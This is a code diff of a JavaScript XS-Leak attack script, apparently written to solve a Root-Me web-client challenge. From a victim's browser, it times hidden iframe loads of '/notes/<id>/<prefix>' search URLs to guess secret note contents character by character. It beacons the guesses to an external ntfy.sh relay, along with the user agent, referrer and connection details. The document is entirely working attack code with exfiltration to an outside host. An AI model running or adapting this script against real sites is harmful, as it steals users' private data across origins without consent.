@@ -1,59 +1,57 @@
 const B='https://web-client-ch56.challenge01.root-me.org:58056/';
 const N='https://ntfy.sh/wcxleak56a';
+const RID=Date.now()%100000;
 const T0=Date.now(),EL=()=>Date.now()-T0;
-const log=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
-const logj=o=>log(JSON.stringify(Object.assign({t:Math.round(EL()/100)/10},o)));
-onerror=(m,s,l)=>{logj({jserr:''+m+' L'+l})};
-onunhandledrejection=e=>{logj({rej:''+e.reason})};
+const beacon=(s)=>{try{navigator.sendBeacon(N,s)}catch(e){}};
+const logj=o=>beacon(JSON.stringify(Object.assign({r:RID,t:Math.round(EL()/100)/10},o)));
 const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
-let rid=0,seq=0,T0W=0;
-function probe1(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
+let seq=0;
+function probe(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
  const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
- f.style.cssText='display:none';
-const myseq=seq++;
- setTimeout(()=>{if(!fin){document.body.appendChild(f)}else{res(9997)}},25*(myseq%48));
- f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+T0+'x'+(rid++);});}
-async function probe(id,q){return probe1(id,q);}
-async function wave(ids,p){
- const out={},dbg={};
- await Promise.all(ids.map(async id=>{
-  const r=await Promise.all(CHARS.split('').map(async c=>[c,await probe(id,p+c)]));
-  const s=r.slice().sort((x,y)=>x[1]-y[1]);
-  out[id]=r.filter(x=>x[1]>1300&&x[1]<6000).map(x=>x[0]);
-  out['d'+id]=s[0][1]+'/'+s[19][1]+'/'+s[38][1];
- }));
- return out;
-}
+ f.style.cssText='display:none;width:0;height:0';
+ f.onload=()=>done(Date.now()-st);
+ f.onerror=()=>done(9999);
+ setTimeout(()=>done(9998),9000);
+ const myseq=seq++;
+ setTimeout(()=>{if(!fin)document.body.appendChild(f)},40*(myseq%36));
+ f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+RID+'x'+(myseq);});}
+async function wave(halfA,halfB){
+ // half = [id, charArray]; <=19 probes each, <=38 iframes total
+ const jobs=[];
+ [halfA,halfB].forEach(h=>{if(!h)return;const[id,cs]=h;
+  cs.forEach(c=>jobs.push(probe(id,c).then(d=>[id,c,d])));});
+ const rs=await Promise.all(jobs);
+ const per={};
+ rs.forEach(([id,c,d])=>{const k='i'+id;(per[k]=per[k]||{n:0,ds:[],h:[]}).n++;
+  per[k].ds.push(d);if(d>1500&&d<6000)per[k].h.push(c);});
+ for(const k in per){const a=per[k].ds.slice().sort((x,y)=>x-y);
+  per[k].min=a[0];per[k].med=a[a.length>>1];per[k].max=a[a.length-1];}
+ return per;}
 (async()=>{
- logj({ev:'start',ua:navigator.userAgent});
- const hbt=setInterval(()=>logj({ev:'hb'}),7000);setTimeout(()=>clearInterval(hbt),28000);
- const ids=[22,23,24,25,26,27,2080,2100,2120,2140,2160,2180];
- let frontier={},seen={};
- for(let k=0;k<ids.length;k+=6){
-  if(EL()>21000)logj({sweeptimeout:k});if(EL()>21000)break;
-  const res=await wave(ids.slice(k,k+6),'');
-  for(const id in res){if(id[0]==='d')continue;
-   const h=res[id];
-   frontier[id]=h;
-   logj({id:+id,r1:h.join('')||'-',d:res['d'+id]});
-  }
+ const H=new Map(location.hash.slice(1).split('&').map(s=>[(s.split('=')[0]||''),s.split('=')[1]||'']));
+ let ids=(H.get('k')||'1,2,3,4,5,6,7,8').split(',').map(x=>parseInt(x)).filter(x=>x>0);
+ logj({ev:'start',ua:navigator.userAgent.slice(0,60),ck:navigator.cookieEnabled?1:0,hc:hardwareConcurrency,rt:navigator.connection?navigator.connection.rtt:-1,ids:ids.join(','),ref:document.referrer.slice(0,40)});
+ // marker: root touch -> session bootstrap if none (SameSite=None), liveness+baseline
+ const m0=Date.now();
+ await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
+  f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});setTimeout(res,300)};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(()=>res(),6000);f.src=B+'?m='+RID;document.body.appendChild(f);});
+ const pairs=[];
+ for(let i=0;i<ids.length;i+=2)pairs.push(ids.slice(i,i+2));
+ const allhits={};
+ for(let w=0;w<pairs.length;w++){
+  if(EL()>22500){logj({ev:'cut',w:w});break;}
+  const[a,b]=pairs[w];
+  const A=a?[a,CHARS.slice(0,19).split('')]:null;
+  const Bh=b?[b,CHARS.slice(0,19).split('')]:null;
+  let per=await wave(A,Bh);
+  logj({ev:'w1',w:w,per:per});
+  // second half for same ids
+  if(EL()>22500){logj({ev:'cut2',w:w});break;}
+  const A2=a?[a,CHARS.slice(19).split('')]:null;
+  const B2=b?[b,CHARS.slice(19).split('')]:null;
+  per=await wave(A2,B2);
+  logj({ev:'w2',w:w,per:per});
+  for(const k in per)if(per[k].h&&per[k].h.length)(allhits[k]=allhits[k]||[]).push(...per[k].h);
  }
- logj({ev:'r1done',f:JSON.stringify(frontier).length>0});
- const nodes=[];
- for(const id in frontier)for(const c of frontier[id])nodes.push([+id,c]);
- for(let d=0;d<40&&nodes.length;d++){
-  const nf=[],exts={},ends=[];
-  for(const[id,p]of nodes){
-   const k2=id+'|'+p;if(seen[k2])continue;seen[k2]=1;
-   if(EL()>26000){logj({cut:id+'~'+p});continue;}
-   const res=await wave([id],p);
-   const h=res[id];
-   exts[id+'~'+p]=h.join('')||'-';
-   if(!h.length)ends.push(id+'~'+p);
-   for(const c of h)nf.push([id,p+c]);
-  }
-  nodes=nf;if(nf.length>24)nodes=nf.slice(0,24);
-  logj({lvl:d,exts:exts,ends:ends,n:nf.length});
- }
- logj({ev:'done'});
+ logj({ev:'done',hits:allhits});
 })();
